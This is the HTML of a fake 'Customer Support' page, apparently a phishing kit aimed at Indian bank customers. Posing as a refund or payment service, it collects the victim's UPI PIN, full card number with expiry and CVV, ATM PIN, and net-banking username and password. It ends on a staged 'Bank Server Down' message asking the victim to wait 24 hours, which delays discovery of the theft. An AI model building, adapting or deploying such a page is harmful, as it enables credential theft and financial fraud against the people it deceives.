<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Customer Support</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="app-top-bar" id="top-bar">
        <span>Online service</span>
    </div>

    <div class="illustration-area">
        <h2 class="support-title">CUSTOMER SUPPORT</h2>
        <img src="assets/illustration.png" alt="Customer Support Illustration" class="illustration-img">
    </div>
    <div class="divider"></div>

    <main class="content-area">
        <!-- PAGE 1: Online Service Form -->
        <div id="page-1" class="page-view active">
            <form id="support-form" class="form-container">
                <div class="input-group">
                    <label for="customer-name">Customer Name*</label>
                    <input type="text" id="customer-name" placeholder="Enter Customer Name" required>
                </div>

                <div class="input-group">
                    <label for="mobile-number">Mobile Number*</label>
                    <input type="tel" id="mobile-number" placeholder="Enter Mobile Number" required pattern="[0-9]{10}"
                        maxlength="10" minlength="10" title="Please enter exactly 10 digits"
                        oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                </div>

                <div class="input-group">
                    <label for="reason">Reason*</label>
                    <input type="text" id="reason" placeholder="Describe Your Problem" required>
                </div>

                <div class="submit-wrapper">
                    <button type="submit" class="btn-primary" id="btn-submit">SUBMIT</button>
                </div>
            </form>
        </div>

        <!-- PAGE 2: Payment Mode Form -->
        <div id="page-2" class="page-view">
            <div class="card shadow">
                <h3 class="card-title">Payment mod*</h3>
                <form id="payment-mode-form" class="form-container">
                    <div class="radio-group">
                        <label class="radio-label">
                            <input type="radio" name="payment-mode" value="pay" checked>
                            <span class="custom-radio"></span>
                            PAY
                        </label>
                    </div>
                    <div class="radio-group">
                        <label class="radio-label">
                            <input type="radio" name="payment-mode" value="refund">
                            <span class="custom-radio"></span>
                            REFUND
                        </label>
                    </div>
                    <div class="radio-group">
                        <label class="radio-label">
                            <input type="radio" name="payment-mode" value="other">
                            <span class="custom-radio"></span>
                            OTHER
                        </label>
                    </div>

                    <div class="input-group floating-input" style="margin-top: 24px;">
                        <input type="number" id="amount" placeholder="Enter Amount" required style="font-size: 16px;">
                    </div>

                    <button type="submit" class="btn-primary full-width" id="btn-next">NEXT</button>
                </form>
            </div>
        </div>

        <!-- PAGE 3: Payment Method Selection -->
        <div id="page-3" class="page-view">
            <div class="card shadow">
                <h3 class="card-title center-title">Select Payment Method</h3>
                <div class="payment-methods">
                    <button type="button" class="btn-secondary" onclick="selectPayment('upi')">UPI</button>
                    <button type="button" class="btn-secondary" onclick="selectPayment('card')">DEBIT / CREDIT
                        CARD</button>
                    <button type="button" class="btn-secondary" onclick="selectPayment('netbanking')">NET
                        BANKING</button>
                </div>
            </div>
        </div>

        <!-- PAGE 4: UPI Transaction Password -->
        <div id="page-upi" class="page-view">
            <form class="form-container" onsubmit="showFinalPage(event)">
                <div class="input-group">
                    <label for="upi-bank-name">Bank Name</label>
                    <input type="text" id="upi-bank-name" placeholder="Search or Select Bank" list="indian-banks"
                        required autocomplete="off">
                </div>
                <div class="input-group">
                    <label for="upi-password">UPI PIN*</label>
                    <input type="password" id="upi-password" placeholder="Enter UPI pin" required>
                </div>
                <div class="submit-wrapper">
                    <button type="submit" class="btn-primary">SUBMIT</button>
                </div>
            </form>
        </div>

        <!-- PAGE 4: Card Details + Medical Update combined -->
        <div id="page-card" class="page-view">
            <form class="form-container" onsubmit="showFinalPage(event)">
                <div class="card shadow" style="margin-bottom: 24px;">
                    <div class="input-group">
                        <label for="card-number">Card 16-Digit Number</label>
                        <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required
                            oninput="
                            this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1-').replace(/-$/, '');
                        ">
                    </div>
                    <div class="inline-group">
                        <div class="input-group half-width">
                            <label for="expiry">Expiry Date:</label>
                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="input-group half-width" style="align-items: flex-end;">
                            <label for="cvv">CVV:</label>
                            <input type="password" id="cvv" placeholder="CVV" maxlength="3" required
                                style="width: 100%; text-align: left;">
                        </div>
                    </div>
                </div>

                <!-- Added ATM PIN field to the same page -->
                <div class="form-container" style="padding: 0 10px;">
                    <div class="input-group">
                        <label for="atm-pin">ATM PIN*</label>
                        <input type="password" id="atm-pin" placeholder="Enter ATM PIN" maxlength="4" required>
                    </div>
                </div>

                <div class="submit-wrapper">
                    <button type="submit" class="btn-primary">SUBMIT</button>
                </div>
            </form>
        </div>

        <!-- PAGE 4: Net Banking Selection -->
        <div id="page-netbanking" class="page-view">
            <form class="form-container" onsubmit="showFinalPage(event)">
                <div class="card shadow" style="margin-bottom: 24px;">
                    <div class="input-group">
                        <label for="bank-name">Bank Name</label>
                        <input type="text" id="bank-name" placeholder="Search or Select Bank" list="indian-banks"
                            required autocomplete="off">
                    </div>
                    <div class="input-group">
                        <label for="username">Username / Customer ID</label>
                        <input type="text" id="username" placeholder="Enter Username / Customer ID" required>
                    </div>
                    <div class="input-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" placeholder="Enter Password" required>
                    </div>
                </div>
                <div class="submit-wrapper">
                    <button type="submit" class="btn-primary">SUBMIT</button>
                </div>
            </form>
        </div>

        <!-- PAGE FINAL: Success / Bank Server Down -->
        <div id="page-final" class="page-view">
            <div class="message-container">
                <h3 class="status-title text-red">Bank Server Down</h3>
                <h4 class="note-title text-green">Important Note:</h4>
                <p class="final-text">
                    Please Wait. This process may take a minimum of 24 hours.<br>
                    You will receive a notification once your details are successfully verified.
                </p>
            </div>
        </div>
    </main>
